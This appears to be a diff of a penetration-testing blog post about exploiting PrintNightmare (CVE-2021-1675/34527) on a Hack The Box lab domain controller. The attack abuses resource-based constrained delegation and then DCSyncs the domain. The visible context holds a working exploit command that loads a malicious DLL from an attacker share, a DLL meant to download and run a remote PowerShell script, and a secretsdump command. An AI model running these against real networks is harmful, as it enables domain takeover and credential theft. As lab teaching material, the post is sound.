@@ -3,10 +3,10 @@ layout: post
 title: "Leveraging PrintNightmare to Abuse RBCD and DCSync the Domain"
 date: 2021-06-30 23:00:00 +0300
 author: snovvcrash
-tags: [internal-pentest, active-directory, print-spooler, printer-bug, cve-2021-1675, arbitary-file-write, impacket, rbcd]
+tags: [internal-pentest, active-directory, print-spooler, printer-bug, cve-2021-1675l, CVE-2021-34527, arbitary-file-write, impacket, rbcd]
 ---
 
-A relatively stealthy way to exploit PrintNightmare (CVE-2021-1675) by configuring and abusing RBCD on a domain controller.
+A relatively stealthy way to exploit PrintNightmare (CVE-2021-1675 / CVE-2021-34527) by configuring and abusing RBCD on a domain controller.
 
 <!--cut-->
 
@@ -18,19 +18,19 @@ A relatively stealthy way to exploit PrintNightmare (CVE-2021-1675) by configuri
 
 ## Prologue
 
-The recent [PrintNightmare](https://github.com/afwu/PrintNightmare) (post CVE-2021-1675) exploit abuses <strike>in</strike>famous Print Spooler service in order to load and execute arbitary code on a Windows machine.
+The recent [PrintNightmare](https://github.com/afwu/PrintNightmare) (post CVE-2021-1675, *EDIT: a few days later Microsoft assinged it a brand new **CVE-2021-34527***) exploit abuses <strike>in</strike>famous Print Spooler service in order to load and execute arbitary code on a Windows machine.
 
 I won't dive into the vulnerability analysis because exploit authors will definitely do it better on the upcoming Black Hat event. As for now a brief description of the attack [can be found on the GitHub](https://github.com/afwu/PrintNightmare#cve-2021-1675-analysis).
 
 Thanks to [@cube0x0](https://twitter.com/cube0x0/status/1409928527957344262) now we have [an impacket-based exploit](https://github.com/cube0x0/CVE-2021-1675) to trigger RCE from a Linux box. Another thing I though about is the red team aspect when generating a custom DLL binary. Good old *msfvenom* is (totally) not enough to fly under the radar of commercial antivirus solutions and/or the SOC team operators. If you ask me, I'd rather not run any C2 agents on the DC but aim for standard Active Directory persistence techniques.
 
-So, what can we do when having access to code execution on the behalf of DC machine account and nothing more? Here is when resource-based constrained delegation comes in: acting on the behalf of a computer account an adversary can configure RBCD bits for that specific computer object, so that a full AD compromise becomes possible with no need for [adding new users](https://github.com/newsoft/adduser) to privileged groups (which is surely monitored) or running "noisy" malicious stuff on the DC!
+So, what can we do when having access to code execution on the behalf of DC machine account and nothing more? Here is when resource-based constrained delegation comes in: impersonating a computer account an adversary can configure RBCD bits for that specific computer object, so that a full AD compromise becomes possible with no need for [adding new users](https://github.com/newsoft/adduser) to privileged groups (which is surely monitored) or running "noisy" malicious stuff on the DC!
 
 ## Testing Environment
 
-For demonstration purposes I will use [Multimaster](https://www.hackthebox.eu/home/machines/profile/232) - a retired Hack The Box machine - as a lab to play with PrintNightmare:
+For demonstration purposes I will use [Multimaster](https://www.hackthebox.eu/home/machines/profile/232) - a retired machine from Hack The Box - as a lab to play with PrintNightmare:
 
-```
+```powershell
 PS > systeminfo
 
 Host Name:                 MULTIMASTER
@@ -83,7 +83,7 @@ Hyper-V Requirements:      A hypervisor has been detected. Features required for
 
 ## Exploiting PrintNightmare
 
-The first thing I want to do is to prepare a skeleton for malicious DLL binary that will source and execute a PowerShell script served by an HTTP server on my machine. To construct a DLL one may use [a template](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own) from HackTricks. A thing to remember is that a threaded approach should be used to run the code in order not to kill the parent process of Spooler service when exiting (similar to `EXITFUNC=thread` when generating a payload with msfvenom). Otherwise the Spooler will probably die and you will not have a second chance to trigger the RCE if something goes wrong.
+The first thing I want to do is to prepare a skeleton for malicious DLL binary that will source and execute a PowerShell script served by an HTTP server on my machine. To construct a DLL one may use [a template](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own) from HackTricks. Another thing to remember is that a threaded approach should be used to run the command in order not to kill the parent process of Spooler service when exiting (similar to `EXITFUNC=thread` when generating a payload with msfvenom). Otherwise the Spooler will probably die and you will not have a second chance to trigger the RCE if something goes wrong.
 
 ```c
 // pwn.c
@@ -156,11 +156,11 @@ Then move the binary to the Samba share and [check that it's accessible](https:/
 
 [![prepare-samba.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/prepare-samba.png)](/assets/images/leveraging-printnightmare-to-abuse-rbcd/prepare-samba.png)
 
-I will download and install the modified impacket library within a virtual environment:
+I will download and install [the modified impacket library](https://github.com/cube0x0/impacket) within a virtual environment as well as download [the exploit script](https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py):
 
 [![install-impacket.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/install-impacket.png)](/assets/images/leveraging-printnightmare-to-abuse-rbcd/install-impacket.png)
 
-Note that dynamic `pDriverPath` (location of the `UNIDRV.DLL` binary) enumeration feature [was added by cube0x0](https://github.com/cube0x0/CVE-2021-1675/commit/3bad3016aca9a6ebb75e5e687614d1c0d045b1f6) a few hours ago, without it the adversary had to change the script according to the environment:
+Note that dynamic `pDriverPath` (location of the `UNIDRV.DLL` binary) enumeration feature [was added by cube0x0](https://github.com/cube0x0/CVE-2021-1675/commit/3bad3016aca9a6ebb75e5e687614d1c0d045b1f6) a couple of hours after the release - without it the adversary would have to change the script according to the environment:
 
 ```powershell
 PS > ls C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_*
@@ -168,7 +168,7 @@ PS > ls C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_*
 
 [![get-pdriverpath.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/get-pdriverpath.png)](/assets/images/leveraging-printnightmare-to-abuse-rbcd/get-pdriverpath.png)
 
-Fire up an HTTP server with Python and trigger the exploit:
+Fire up an HTTP server with Python and trigger the bug:
 
 ```bash
 $ python CVE-2021-1675.py megacorp.local/lowpriv:'Passw0rd1!'@10.10.10.179 '\\10.10.14.11\share\pwn.dll'
@@ -203,4 +203,8 @@ $ secretsdump.py multimaster.megacorp.local -dc-ip 10.10.10.179 -k -no-pass -jus
 
 ## Afterthoughts
 
-The described vulnerability poses enormous risks to active directory infrastructures and must never be used for illegal purposes. To mitigate the risk the Spooler service should be disabled or uninstalled until an official fix is released by vendor. An example on how to disable the Print Spooler can be found [here](https://github.com/gtworek/PSBits/blob/master/Misc/StopAndDisableDefaultSpoolers.ps1).
+The described vulnerability poses enormous risks to active directory infrastructures and must never be used for illegal purposes. To mitigate the risk the Spooler service should be disabled or uninstalled until an official fix is released by vendor. An example on how to disable the Print Spooler can be found [here](https://github.com/LaresLLC/CVE-2021-1675).
+
+*EDIT*. Based on the state of user's access token (elevated / non-elevated) whose account one's impersonating when making RPC calls to `RpcAddPrinterDriverEx`, the attack may succeed or fail. On the following diagram (by [@StanHacked](https://twitter.com/StanHacked)) there're some conditions that can affect the token state:
+
+[![making-sence-of-printnightmare.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/dcsync.png)](https://pbs.twimg.com/media/E5ShO9wXwAAPAC9?format=jpg&name=4096x4096)
